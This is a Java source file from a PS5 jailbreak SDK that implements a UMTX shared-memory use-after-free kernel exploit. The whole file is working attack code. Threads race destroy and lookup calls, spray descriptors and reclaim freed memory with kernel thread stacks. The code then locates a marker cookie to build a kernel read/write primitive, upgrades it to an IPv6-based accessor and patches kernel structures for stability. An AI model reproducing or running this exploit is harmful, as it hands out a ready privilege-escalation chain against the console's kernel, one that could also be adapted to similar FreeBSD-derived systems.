package org.ps5jb.client.payloads.umtx.impl2;

import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicLong;

import org.ps5jb.client.payloads.umtx.kernel.KernelAddressClassifier;
import org.ps5jb.client.payloads.umtx.kernel.KernelOffsetsCalculator;
import org.ps5jb.client.payloads.umtx.kernel.KernelStabilizer;
import org.ps5jb.client.payloads.umtx.kernel.MemoryDumper;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.loader.Status;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkException;
import org.ps5jb.sdk.core.kernel.KernelAccessorIPv6;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.sdk.include.PThread;
import org.ps5jb.sdk.include.PThreadNp;
import org.ps5jb.sdk.include.sys.pthreadtypes.PThreadType;
import org.ps5jb.sdk.lib.LibKernel;

/**
 * UMTX exploit from cheburek3000, adapted for this SDK:
 * https://github.com/cheburek3000/bdj-sdk/blob/umtx/samples/ps5-payload-loader/src/org/homebrew/umtx/Exploit.java
 */
public class UmtxExploitJob implements Runnable {
    private LibKernel mainLibKernel = new LibKernel();

    // Constants
    private static final int UMTX_OP_SHM = 26; // 25 on BSD
    private static final int UMTX_SHM_CREAT = 0x0001;
    private static final int UMTX_SHM_LOOKUP = 0x0002;
    private static final int UMTX_SHM_DESTROY = 0x0004;

    private static final int CPU_SETSIZE = 16;
    private static final int CPU_LEVEL_WHICH = 3;
    private static final int CPU_WHICH_TID = 1;

    private static final short RTP_PRIO_REALTIME = 2;
    private static final int RTP_SET = 1;

    private static final int OFFSET_STAT_SIZE = 0x48;

    private static final int PROT_READ = 0x1;
    private static final int PROT_WRITE = 0x2;
    private static final int MAP_SHARED = 0x1;

    // Configuration for race
    private static final short MAIN_TREAD_CORE = 1;
    private static final short MAIN_TREAD_PRIO = 256;
    private static final short[] DESTROYER_TREAD_CORE = new short[] { 2, 3 };
    private static final short[] DESTROYER_TREAD_PRIO = new short[] { 256, 256 };
    private static final short LOOKUP_TREAD_CORE = 4;
    private static final short LOOKUP_TREAD_PRIO = 767;
    private static final short KPRIM_TREAD_CORE = LOOKUP_TREAD_CORE;
    private static final short KPRIM_TREAD_PRIO = 450;
    private static final int NUM_RACE_ATTEMPTS = 0x10000;
    private static final int SPRAY_FDS_PER_THREAD = 0x28;

    // Configuration for post exploit
    static final long PIPE_SLOW_SIZE = 0x10000;
    static final long PIPE_SLOW_BATCH_SIZE = 0x1000;

    // UMTX key area
    private Pointer shmKey;
    private Pointer fstatBuf;

    // pid for searching for this process later
    private int ourPid;

    // Addresses mapped with mmap which may be corrupted at the end of execution
    private Set mappedKernelStackAddresses;

    // test pipes
    private Pointer pipeTestFds;
    private int pipeTestReadFd = -1;
    private int pipeTestWriteFd = -1;
    private Pointer pipeTestScratchBuf;

    // indicator that the job has run
    public volatile boolean finished = false;

    static int pinToCoreSelf(int core, LibKernel libKernel) {
        Pointer mask = Pointer.calloc(CPU_SETSIZE);
        try {
            int byteIdx = core / 8;
            int bitIdx = core % 8;
            mask.write1(byteIdx, (byte) (1 << bitIdx));
            return libKernel.cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID,
                    -1, CPU_SETSIZE, mask);
        } finally {
            mask.free();
        }
    }

    static int setRtprioSelf(short value, LibKernel libkernel) {
        Pointer prio = Pointer.calloc(0x4);
        try {
            prio.write2(RTP_PRIO_REALTIME);
            prio.write2(2, value);
            return libkernel.rtprio_thread(RTP_SET, 0, prio);
        } finally {
            prio.free();
        }
    }

    private static int UmtxShmCreate(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_CREAT, key, Pointer.NULL);
    }

    private static int UmtxShmDestroy(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_DESTROY, key, Pointer.NULL);
    }

    private static int UmtxShmLookup(Pointer key, LibKernel libkernel) {
        return libkernel._umtx_op(Pointer.NULL, UMTX_OP_SHM, UMTX_SHM_LOOKUP, key, Pointer.NULL);
    }

    private static int ShmResizeTag(int fd, LibKernel libkernel) {
        return libkernel.ftruncate(fd, fd * 0x4000);
    }

    private static int ShmClose(int fd, LibKernel libkernel) {
        return libkernel.close(fd);
    }

    private int GetShmTag(int fd, LibKernel libkernel) {
        int returnCode;
        returnCode = libkernel.fstat(fd, fstatBuf);
        if (returnCode != 0) {
            return returnCode;
        }
        long tag = fstatBuf.read8(OFFSET_STAT_SIZE) / 0x4000;
        if (tag != (tag & 0x3ff)) {
            tag = fd;
        }
        return (int) tag;
    }

    private static void println(String s) {
        Status.println("    " + s);
    }

    public int prepare() {
        int returnCode = 0;

        // Create a UMTX key area to use, these just have to be valid pointers
        this.shmKey = Pointer.calloc(0x1000);

        // Create buffer for fstat
        this.fstatBuf = Pointer.calloc(0x100);

        // Pin main thread to core 1 with high prio
        returnCode = pinToCoreSelf(MAIN_TREAD_CORE, mainLibKernel);
        if (returnCode < 0) {
            println("[-] Failed to pin main thread, returnCode: " + returnCode);
            return returnCode;
        }
        returnCode = setRtprioSelf(MAIN_TREAD_PRIO, mainLibKernel);
        if (returnCode < 0) {
            println("[-] Failed to set main thread prio, returnCode: " + returnCode);
            return returnCode;
        }
        //println("[+] Main thread on cpu: " + mainLibKernel.sceKernelGetCurrentCpu());

        // Get pid for searching for this process later
        this.ourPid = mainLibKernel.getpid();
        println("[+] pid: " + this.ourPid);

        this.mappedKernelStackAddresses = new HashSet();

        // Create pipe for testing memory
        this.pipeTestFds = Pointer.calloc(8);
        returnCode = mainLibKernel.pipe(this.pipeTestFds);
        if (returnCode < 0) {
            println("[+] Failed to create test pipe, returnCode: " + returnCode);
        }
        this.pipeTestReadFd = pipeTestFds.read4();
        this.pipeTestWriteFd = pipeTestFds.read4(4);
        this.pipeTestScratchBuf = Pointer.calloc(PIPE_SLOW_SIZE);

        kPrimPrepare();

        return 0;
    }

    public void cleanup() {
        // Cleans up all the native allocations at the end of execution
        if (shmKey != null) {
            shmKey.free();
        }

        if (fstatBuf != null) {
            fstatBuf.free();
        }

        if (pipeTestFds != null) {
            pipeTestFds.free();
        }

        if (pipeTestReadFd != -1) {
            mainLibKernel.close(pipeTestReadFd);
        }

        if (pipeTestWriteFd != -1) {
            mainLibKernel.close(pipeTestWriteFd);
        }

        if (pipeTestScratchBuf != null) {
            pipeTestScratchBuf.free();
        }
    }

    class Sychronizer {
        public AtomicBoolean runSignal;
        public AtomicBoolean resetSignal;
        public AtomicBoolean stopSignal;
        public AtomicInteger waitingReadyCounter;
        public AtomicInteger waitingResetCounter;
        private int numJobs;

        public Sychronizer(int numJobs) {
            this.numJobs = numJobs;
            runSignal = new AtomicBoolean();
            resetSignal = new AtomicBoolean();
            stopSignal = new AtomicBoolean();
            waitingReadyCounter = new AtomicInteger();
            waitingResetCounter = new AtomicInteger();
        }

        void runWhenAllReady() {
            while (waitingReadyCounter.get() != numJobs) {
                Thread.yield();
            }
            resetSignal.set(false);
            runSignal.set(true);
        }

        void waitAllDone() {
            while (waitingResetCounter.get() != numJobs) {
                Thread.yield();
            }
        }

        void stop() {
            stopSignal.set(true);
            reset();
        }

        void reset() {
            waitingReadyCounter.set(0);
            waitingResetCounter.set(0);
            runSignal.set(false);
            resetSignal.set(true);
        }
    }

    class SynchronizedRepeatableJob implements Runnable {
        protected LibKernel libkernel;

        protected String name;
        private short core;
        private short prio;
        private Sychronizer sync;

        public SynchronizedRepeatableJob(String name, short core, short prio, Sychronizer sync) {
            this.name = name;
            this.core = core;
            this.prio = prio;
            this.sync = sync;
            this.libkernel = new LibKernel();
        }

        @Override
        public void run() {
            prepare();
            loop();
            cleanup();
            println("[+] " + this.name + ": stopped");
        }

        private void prepare() {
            int returnCode;
            //println("[+] " + this.name + ": pinning thread to " + this.core);
            returnCode = pinToCoreSelf(this.core, this.libkernel);
            if (returnCode < 0) {
                println("[-] " + this.name + ": failed to pin thread, returnCode: " + returnCode);
            }
            //println("[+] " + this.name + ": setting prio " + this.prio);
            returnCode = setRtprioSelf(this.prio, this.libkernel);
            if (returnCode < 0) {
                println("[-] " + this.name + ": failed to set prio, returnCode: " + returnCode);
            }
            //println("[+] " + this.name + ": prepaired on cpu " + libkernel.sceKernelGetCurrentCpu());
        }

        private void loop() {
            while (!sync.stopSignal.get()) {
                sync.waitingReadyCounter.incrementAndGet();
                while (!sync.runSignal.get()) {
                    Thread.yield();
                }
                //println("[+] " + this.name + ": work");
                work();
                sync.waitingResetCounter.incrementAndGet();
                //println("[+] " + this.name + ": waiting for reset");
                while (!sync.resetSignal.get()) {
                    Thread.yield();
                }
                //println("[+] " + this.name + ": resetting");
            }
            //println("[+] " + this.name + ": finished");
        }

        protected void work() {
            Thread.yield();
        }

        protected void cleanup() {
            this.libkernel.closeLibrary();
        }
    }

    class DestroyerJob extends SynchronizedRepeatableJob {
        private AtomicInteger destructionsCounter;
        private Pointer shmKey;
        private int[] sprayFds;
        private Pointer sprayShmKey;

        public DestroyerJob(String name, short core, short prio, Sychronizer sync, AtomicInteger destructionsCounter,
                            Pointer shmKey, Pointer sprayShmKey) {
            super(name, core, prio, sync);
            this.destructionsCounter = destructionsCounter;
            this.shmKey = shmKey;
            this.sprayFds = new int[SPRAY_FDS_PER_THREAD];
            this.sprayShmKey = sprayShmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmDestroy(shmKey, libkernel);
            int returnCode;
            //println("[+] " + this.name + ": destroyed, result: " + result);
            if (result == 0) {
                this.destructionsCounter.incrementAndGet();
            }
            for (int i = 0; i < SPRAY_FDS_PER_THREAD; ++i) {
                sprayFds[i] = UmtxShmCreate(sprayShmKey.inc(i * 0x8), libkernel);
                // println("[+] " + this.name + ": created " + sprayFds[i]);
                returnCode = ShmResizeTag(sprayFds[i], libkernel);
                // println("[+] " + this.name + ": resized, returnCode " + returnCode);
                returnCode = UmtxShmDestroy(sprayShmKey.inc(i * 0x8), libkernel);
                // println("[+] " + this.name + ": destroyed, returnCode " + returnCode);
            }
        }
    }

    class LookupJob extends SynchronizedRepeatableJob {
        private AtomicInteger lookupFd;
        private Pointer shmKey;

        public LookupJob(String name, short core, short prio, Sychronizer sync, AtomicInteger lookupFd, Pointer shmKey) {
            super(name, core, prio, sync);
            this.lookupFd = lookupFd;
            this.shmKey = shmKey;
        }

        @Override
        protected void work() {
            int result = UmtxShmLookup(shmKey, libkernel);
            // println("[+] " + this.name + ": looked up, result: " + result);
            lookupFd.set(result);
        }
    }

    public class RaceResult {
        public int returnCode;
        public int numTries;
        public int lookupFd;
        public int reclaimFd;

        public RaceResult(int returnCode) {
            this.returnCode = returnCode;
        }

        public RaceResult(int numTries, int lookupFd, int reclaimFd) {
            this.returnCode = 0;
            this.numTries = numTries;
            this.lookupFd = lookupFd;
            this.reclaimFd = reclaimFd;
        }
    }

    public RaceResult race() {
        Sychronizer destroyerLookupSync = new Sychronizer(3);
        AtomicInteger destructionsCounter = new AtomicInteger();
        AtomicInteger lookupFd = new AtomicInteger();
        int reclaimFd = -1;

        DestroyerJob[] destroyerJobs = new DestroyerJob[2];
        Thread[] destroyerThreads = new Thread[2];
        for (int i = 0; i < 2; i++) {
            destroyerJobs[i] = new DestroyerJob("destroyer[" + i + "]", DESTROYER_TREAD_CORE[i],
                    DESTROYER_TREAD_PRIO[i], destroyerLookupSync, destructionsCounter, this.shmKey,
                    this.shmKey.inc(0x8 * (SPRAY_FDS_PER_THREAD * i + 1)));
            destroyerThreads[i] = new Thread(destroyerJobs[i]);
        }
        for (int i = 0; i < 2; i++) {
            destroyerThreads[i].start();
        }

        LookupJob lookupJob = new LookupJob("lookup", LOOKUP_TREAD_CORE, LOOKUP_TREAD_PRIO, destroyerLookupSync,
                lookupFd, this.shmKey);
        Thread lookupThread = new Thread(lookupJob);
        lookupThread.start();
        int numAttemts = 0;
        int numDC2 = 0;
        int numSprays = 0;

        for (int attempt = 0; attempt < NUM_RACE_ATTEMPTS; ++attempt) {
            numAttemts++;
            if ((numAttemts % 500) == 0) {
                println("[+] Race attempt " + numAttemts);
            }
            // prepare
            int descriptor = UmtxShmCreate(this.shmKey, this.mainLibKernel);
            //println("[+] created descriptor " + descriptor);
            int returnCode;
            returnCode = ShmResizeTag(descriptor, this.mainLibKernel);
            //println("[+] ShmResizeTag returned " + returnCode);
            returnCode = ShmClose(descriptor, this.mainLibKernel);
            //println("[+] ShmClose returned " + returnCode);

            // run
            destroyerLookupSync.runWhenAllReady();

            // check
            destroyerLookupSync.waitAllDone();
            if (destructionsCounter.get() == 2) {
                numDC2++;
            }
            //println("[+] destructionsCounter: " + destructionsCounter.get());
            if (lookupFd.get() == -1) {
                //println("[+] lookup failed");
            } else {
                //println("[+] lookup succeeded, lookupFd: " + lookupFd.get());
            }
            if (destructionsCounter.get() == 2 && lookupFd.get() != -1) {
                numSprays++;
                //println("[+] destructionsCounter: " + destructionsCounter.get() + ", lookupFd: " + lookupFd.get());
                reclaimFd = GetShmTag(lookupFd.get(), mainLibKernel);
                //println("[+] reclaimFd: " + reclaimFd);
            }
            destructionsCounter.set(0);

            for (int i = 0; i < destroyerJobs.length; ++i) {
                for (int j = 0; j < destroyerJobs[i].sprayFds.length; ++j) {
                    int sprayFd = destroyerJobs[i].sprayFds[j];
                    if (sprayFd != reclaimFd && sprayFd != -1 && sprayFd != 0) {
                        ShmClose(sprayFd, mainLibKernel);
                    }
                }
            }

            if (reclaimFd != -1 && reclaimFd != lookupFd.get()) {
                println("[+] reclaimed: " + reclaimFd + " != " + lookupFd.get());
                println("[+] Race succeeded, numAttempts: " + numAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
                destroyerLookupSync.stop();
                return new RaceResult(attempt + 1, lookupFd.get(), (int) reclaimFd);
            } else {
                reclaimFd = -1;
            }

            // finalize
            if (lookupFd.get() != -1) {
                // println("[+] closing not reclaimed lookupFd: " + lookupFd);
                returnCode = ShmClose(lookupFd.get(), mainLibKernel);
                //println("[+] ShmClose(" + lookupFd + ") returned " + returnCode);
            }
            if (attempt + 1 == NUM_RACE_ATTEMPTS) {
                destroyerLookupSync.stop();
            } else {
                destroyerLookupSync.reset();
            }
        }
        println("[+] Race failed, numAttemts: " + numAttemts + ", numDC2: " + numDC2 + ", numSprays: " + numSprays);
        return new RaceResult(-1);
    }

    static final int KPRIM_NOP   = 0;
    static final int KPRIM_READ  = 1;
    static final int KPRIM_WRITE = 2;
    static final int KPRIM_BUF_SIZE = 0x8;
    private static final int NUM_KPRIM_ATTEMPTS = 10;
    private static final int NUM_KPRIM_THREADS = 0x100;

    class KPrimThreadData {
        private LibKernel libkernel;

        public AtomicBoolean neoFound;
        public AtomicInteger neo;
        public AtomicBoolean resetSignal;
        public AtomicInteger selectedOnceCounter;
        public AtomicInteger cmd;
        public AtomicLong uaddr;
        public AtomicLong kaddr;
        public AtomicInteger len;
        public AtomicLong readCounter;
        public AtomicLong writeCounter;

        // Pipe for read/write prim via stack reads/writes
        public Pointer pipeSlowFds;
        public int pipeSlowReadFd = -1;
        public int pipeSlowWriteFd = -1;
        public Pointer pipeSlowScratchBuf;

        public Pointer slowReadWriteBuf;
        public Pointer slowReadValue;
        public Pointer slowWriteValue;

        KPrimThreadData() {
            this.libkernel = new LibKernel();
            this.neoFound = new AtomicBoolean();
            this.neo = new AtomicInteger();
            this.resetSignal = new AtomicBoolean();
            this.selectedOnceCounter = new AtomicInteger();
            this.cmd = new AtomicInteger();
            this.uaddr = new AtomicLong();
            this.kaddr = new AtomicLong();
            this.len = new AtomicInteger();
            this.readCounter = new AtomicLong();
            this.writeCounter = new AtomicLong();
            resetToDefaults();

            // Create pipe for read/write prim via stack reads/writes
            this.pipeSlowFds = Pointer.calloc(8);
            int returnCode = libkernel.pipe(this.pipeSlowFds);
            if (returnCode < 0) {
                println("[+] Failed to create pipe, returnCode: " + returnCode);
            }
            this.pipeSlowReadFd = this.pipeSlowFds.read4();
            this.pipeSlowWriteFd = this.pipeSlowFds.read4(4);
            this.pipeSlowScratchBuf = Pointer.calloc(PIPE_SLOW_SIZE);

            this.slowReadWriteBuf = Pointer.calloc(0x4000);
            this.slowReadValue = Pointer.calloc(KPRIM_BUF_SIZE);
            this.slowWriteValue = Pointer.calloc(KPRIM_BUF_SIZE);
        }

        public void resetToDefaults() {
            this.neoFound.set(false);
            this.neo.set(-1);
            this.resetSignal.set(false);
            this.selectedOnceCounter.set(0);
            this.cmd.set(KPRIM_NOP);
            this.uaddr.set(0);
            this.kaddr.set(0);
            this.len.set(0);
            this.readCounter.set(0);
            this.writeCounter.set(0);
        }

        public void cleanup() {
            if (pipeSlowFds != null) {
                pipeTestFds.free();
            }

            if (pipeSlowReadFd != -1) {
                libkernel.close(pipeSlowReadFd);
            }

            if (pipeSlowWriteFd != -1) {
                libkernel.close(pipeSlowWriteFd);
            }

            if (slowReadWriteBuf != null) {
                slowReadWriteBuf.free();
            }

            if (slowReadValue != null) {
                slowReadValue.free();
            }

            if (slowWriteValue != null) {
                slowWriteValue.free();
            }
        }
    }

    class KPrimJob implements Runnable {
        private LibKernel libkernel;

        private int id;
        private short core;
        private short prio;
        private KPrimThreadData threadData;
        public AtomicBoolean exitSignal;
        private boolean selectedOnce;
        private boolean lastAttempt;

        private long cookie;
        private Pointer cookieBuf;
        private Pointer timeoutBuf;

        public KPrimJob(int id, short core, short prio, KPrimThreadData threadData) {
            this.id = id;
            this.core = core;
            this.prio = prio;
            this.threadData = threadData;
            this.exitSignal = new AtomicBoolean();
            cookie = (0x13370000 + id) << 32;
            this.libkernel = new LibKernel();
            cookieBuf = Pointer.calloc(0x100);
            timeoutBuf = Pointer.calloc(0x10);
            timeoutBuf.write8(0); // tv_sec
            timeoutBuf.write8(8, 500000); // tv_usec
        }

        public void resetToDefaults(boolean lastAttempt) {
            this.exitSignal.set(false);
            this.selectedOnce = false;
            this.lastAttempt = lastAttempt;
        }

        @Override
        public void run() {
            prepare();
            loop();
            if (lastAttempt) {
                cleanup();
            }
        }

        private void prepare() {
            int returnCode;
            // println("[+] kprim[" + this.id + "]: pinning thread to " + this.core);
            returnCode = pinToCoreSelf(this.core, this.libkernel);
            if (returnCode < 0) {
                println("[-] kprim[" + this.id + "]: failed to pin thread, returnCode: " + returnCode);
            }
            if (this.prio != 0) {
                // println("[+] " + this.id + ": setting prio " + this.prio);
                returnCode = setRtprioSelf(this.prio, this.libkernel);
                if (returnCode < 0) {
                    println("[-] " + this.id + ": failed to set prio, returnCode: " + returnCode);
                }
                // println("[+] kprim[" + this.id + "]: prepaired on cpu " + libkernel.getCurrentCpu());
            }

            // Set native thread name to find it later
            try {
                PThread pthreadLib = new PThread(libkernel);
                PThreadNp pthreadNpLib = new PThreadNp(libkernel);

                PThreadType pthread = pthreadLib.self();
                pthreadNpLib.rename(pthread, "reclaim#" + id);
                //println("[+] renamed reclam#" + id + " native thread.");
            } catch (SdkException | RuntimeException | Error e) {
                println("[-] failed to rename the native thread of reclaim#" + id);
            }
        }

        private void loop() {
            while (!exitSignal.get()) {
                if (threadData.neoFound.get()) {
                    if (threadData.neo.get() != id) {
                        // println("[+] kprim[" + this.id + "]: neo found, not me, exiting");
                        exitSignal.set(false);
                        return;
                    }

                    int cmd = threadData.cmd.get();
                    if (cmd == KPRIM_NOP) {
                        Thread.yield();
                        continue;
                    }
                    long len = threadData.len.get();

                    threadData.cmd.set(KPRIM_NOP);
                    switch (cmd) {
                        case KPRIM_READ:
                            //println("[+] kprim[" + this.id + "]: reading " + len + " bytes");
                            threadData.readCounter.incrementAndGet();
                            long read = libkernel.write(threadData.pipeSlowWriteFd, threadData.pipeSlowScratchBuf, len);
                            //println("[+] kprim[" + this.id + "]: read " + read);
                            break;

                        case KPRIM_WRITE:
                            //println("[+] kprim[" + this.id + "]: writing");
                            threadData.writeCounter.incrementAndGet();
                            long write = libkernel.read(threadData.pipeSlowReadFd, threadData.pipeSlowScratchBuf, len);
                            //println("[+] kprim[" + this.id + "]: write " + write);
                            break;

                        default:
                            println("[-] kprim[" + this.id + "]: unknown command");
                    }

                    //println("[+] kprim[" + this.id + "]: waiting for reset");
                    while (!threadData.resetSignal.get()) {
                        Thread.yield();
                    }
                    //println("[+] kprim[" + this.id + "]: resetting");
                } else {
                    cookieBuf.write8(cookie);
                    int returnCode = libkernel.select(1, cookieBuf, Pointer.NULL, Pointer.NULL, timeoutBuf);
                    if (returnCode < 0) {
                        println("[+] " + this.id + ": failed to select, returnCode: " + returnCode);
                    }
                    if (!selectedOnce) {
                        selectedOnce = true;
                        threadData.selectedOnceCounter.incrementAndGet();
                    }

                    Thread.yield();
                }
            }
            // println("[+] kprim[" + this.id + "]: finished");
        }

        private void cleanup() {
            if (cookieBuf != null) {
                cookieBuf.free();
            }

            if (timeoutBuf != null) {
                timeoutBuf.free();
            }

            libkernel.closeLibrary();
        }
    }

    private KPrimThreadData kPrimThreadData;
    private KPrimJob[] kPrimJobs;
    private Thread[] kPrimThreads;

    private void kPrimPrepare() {
        kPrimThreadData = new KPrimThreadData();
        kPrimJobs = new KPrimJob[NUM_KPRIM_THREADS];
        kPrimThreads = new Thread[NUM_KPRIM_THREADS];
        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            kPrimJobs[i] = new KPrimJob(i, KPRIM_TREAD_CORE, KPRIM_TREAD_PRIO, kPrimThreadData);
        }
    }

    public class RWResult {
        public int returnCode;

        public RWResult(int returnCode) {
            this.returnCode = returnCode;
        }
    }

    private boolean isMemoryReadable(Pointer kstack, LibKernel libkernel) {
        long returnCode = libkernel.write(this.pipeTestWriteFd, kstack, 1);
        if (returnCode < 0) {
            println("[-] isMemoryReadable: failed to read from mem, returnCode: " + returnCode);
            return false;
        }
        returnCode = libkernel.read(this.pipeTestReadFd, this.pipeTestScratchBuf, 1);
        if (returnCode < 0) {
            println("[-] isMemoryReadable: failed to read from pipe, returnCode: " + returnCode);
        }
        return true;
    }

    private void stopBadKprimThreads(int neo) {
        println("[+] stopping kprim threads except " + neo);
        kPrimThreadData.neo.set(neo);
        kPrimThreadData.neoFound.set(true);
        kPrimThreadData.resetSignal.set(true);

        for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
            if (i != neo) {
                // println("[+] stopping kprim[" + i + "]");
                try {
                    kPrimThreads[i].join();
                } catch (InterruptedException e) {
                    // println("[+] stopping kprim[" + i + "] failed");
                }
                // println("[+] stopped kprim[" + i + "]");
            }
        }
        println("[+] kprim threads stopped");
    }

    public RWResult getRW(int lookupFd, int reclaimFd) {
        int returnCode;

        // We have 2 fd referencing a shmfd which will be free'd if we close 1 fd...do that
        returnCode = ShmClose(reclaimFd, this.mainLibKernel);
        println("[+] Closed reclaimFd, returnCode: " + returnCode);

        // mmap using the remaining fd to reference the free'd but still initialized vmobject.
        Pointer kstack = this.mainLibKernel.mmap(Pointer.NULL, 0x4000, PROT_READ | PROT_WRITE,
                MAP_SHARED, lookupFd, 0);
        if (kstack.addr() < 0) {
            println("[-] Unable to mmap lookupFd, kstack: " + kstack);
            return new RWResult(-1);
        }
        println("[+] kstack: " + kstack);

        int neo = -1;

        for (int attempt = 0; attempt < NUM_KPRIM_ATTEMPTS; ++attempt) {
            boolean lastAttempt = (attempt + 1) == NUM_KPRIM_ATTEMPTS;
            kPrimThreadData.resetToDefaults();
            for (int i = 0; i < NUM_KPRIM_THREADS; ++i) {
                // println("[+] Starting kPrimThreads[" + i + "]");
                kPrimJobs[i].resetToDefaults(lastAttempt);
                kPrimThreads[i] = new Thread(kPrimJobs[i]);
                kPrimThreads[i].start();
                // println("[+] Started kPrimThreads[" + i + "]");
            }
            println("[+] Started kprim threads. Attempt " + (attempt + 1) + " of " + NUM_KPRIM_ATTEMPTS);

            boolean kstackValid = false;

            while (kPrimThreadData.selectedOnceCounter.get() < NUM_KPRIM_THREADS) {
                mainLibKernel.usleep(500000);
                println("[+] Waiting for all threads to work at least once, current count: "
                        + kPrimThreadData.selectedOnceCounter.get());
            }

            println("[+] Checking kstack memory to be readable");
            if (!isMemoryReadable(kstack, this.mainLibKernel)) {
                // TODO: debug
                if (lastAttempt) {
                    println("[-] Memory still is not readable, unmapping");
                    if (mainLibKernel.munmap(kstack, 0x4000) == -1) {
                        println("[-] Failed to unmap memory after failure");
                    } else {
                        kstack = Pointer.NULL;
                    }
                } else {
                    println("[+] Memory is not readable, trying again");
                }
                stopBadKprimThreads(-1);
                continue;
            }

            println("[+] Checking kstack is not zeros");
            for (int i = 0; i < 0x1000; i += 0x8) {
                long test_qword = kstack.read8(0x3000 + i);
                if (test_qword != 0) {
                    kstackValid = true;
                    break;
                }
            }

            if (!kstackValid) {
                println("[-] Failed to reclaim with kernel stack, trying again");
                stopBadKprimThreads(-1);
                continue;
            }

            println("[+] kernel stack dump:");
            MemoryDumper.dump(kstack.inc(0x3000), 0x1000L);

            println("[+] looking for cookie");
            for (int i = 0x3002; i < 0x4000; i += 0x2) {
                short dword = kstack.read2(i);
                if (dword == 0x1337) {
                    println("[+] cookie found at 0x" + Long.toHexString(i));
                    neo = kstack.read2(i - 2);
                    println("[+] reclaim thread index " + neo);

                    // Webkit implementation uses fixed offset from the cookie
                    // to get the thread. It's probably specific to sched_yield method.
                    // This implementation does not rely on this method but printing
                    // one candidate to compare if it's still fixed.
                    final long potentialThreadOffset = i - 2 + 0x128;
                    if (potentialThreadOffset + 8 <= 0x4000) {
                        KernelPointer threadPtr = KernelPointer.valueOf(kstack.read8(potentialThreadOffset));
                        println("[+] possible thread pointer: " + threadPtr);
                    }
                    break;
                }
            }
            break;
        }

        stopBadKprimThreads(neo);

        if (neo == -1) {
            println("[+] Failed to reclaim with kernel stack, halting this race attempt");
            if (!Pointer.NULL.equals(kstack)) {
                this.mappedKernelStackAddresses.add(kstack);
            }
            kPrimThreadData.cleanup();
        } else {
            KernelReadWrite.setAccessor(new KernelAccessorSlow(kPrimThreadData, kstack));
        }

        return new RWResult(neo);
    }

    @Override
    public void run() {
        final int MAX_ATTEMPTS = 50;

        int lookupFd = -1;
        for (int i = 1; i <= MAX_ATTEMPTS; ++i) {
            if ((i % 10) == 0) {
                println("[+] exploit attempt " + i);
            }
            try {
                prepare();
                RaceResult raceResult = race();
                RWResult rwResult = null;
                if (raceResult.returnCode == 0) {
                    rwResult = getRW(raceResult.lookupFd, raceResult.reclaimFd);
                }
                cleanup();

                if (rwResult != null && rwResult.returnCode != -1) {
                    println("[+] slow kernel r/w obtained");
                    lookupFd = raceResult.lookupFd;
                    break;
                }
            } catch (RuntimeException | Error e) {
                Status.printStackTrace("[-] unexpected runtime error", e);
            }
        }

        // Slow kernel accessor installed, upgrade to a faster one
        if (KernelReadWrite.getAccessor() instanceof KernelAccessorSlow) {
            KernelAccessorSlow ka = (KernelAccessorSlow) KernelReadWrite.getAccessor();
            int swVer = mainLibKernel.getSystemSoftwareVersion();
            KernelOffsetsCalculator off = new KernelOffsetsCalculator();
            KernelAddressClassifier classifier = KernelAddressClassifier.fromBuffer(new Pointer(ka.getKstack().addr() + 0x3000, new Long(0x1000L)));
            if (off.calculate(swVer, classifier, "reclaim#" + kPrimThreadData.neo.get())) {
                println("[+] thread=" + off.threadAddress);
                println("[+] proc=" + off.processAddress);
                println("[+] ofiles=" + off.processOpenFilesAddress);
                println("[+] allproc=" + off.allProcAddress);
                if (!KernelPointer.NULL.equals(off.kernelAddressBase)) {
                    println("[+] kdata=" + off.kernelDataBase);
                    println("[+] kbase=" + off.kernelAddressBase);
                } else {
                    println("[-] kbase cannot be determined due to unknown offsets on the current firmware version");
                }
                try {
                    if (!KernelPointer.NULL.equals(off.processOpenFilesAddress)) {
                        KernelReadWrite.setAccessor(new KernelAccessorIPv6(off.processOpenFilesAddress, off.kernelAddressBase));
                        println("[+] installed ipv6 based kernel r/w");

                        KernelStabilizer stabilizer = new KernelStabilizer();
                        stabilizer.fixupKernelStack(off.threadAddress);
                        println("[+] kstack stabilized");

                        int closeRet = stabilizer.fixupSharedMemory(off.processOpenFilesAddress, lookupFd);
                        println("[+] open files stabilized; lookup fd close=" + closeRet);

                        // This does not seem necessary because the exploit is triggered fast enough that there are no lingering mappings
                        if (mappedKernelStackAddresses.size() > 0) {
                            int numFixes = stabilizer.fixupVmSpace(off.processAddress, mappedKernelStackAddresses);
                            println("[+] vm space stabilized; fixed " + numFixes + " entries");
                        }
                    } else {
                        KernelReadWrite.setAccessor(null);
                    }
                } catch (SdkException | RuntimeException | Error e) {
                    Status.printStackTrace("[-] unable to upgrade kernel accessor", e);
                    KernelReadWrite.setAccessor(null);
                }
            } else {
                println("[-] failed to determine kernel addresses");
            }

            if (KernelReadWrite.getAccessor() == null) {
                println("[-] removing slow kernel accessor before exiting");
            }

            // TODO: experiment with closing the last reclaim job
        } else {
            println("[-] failed");
        }

        mainLibKernel.closeLibrary();
        finished = true;
    }
}
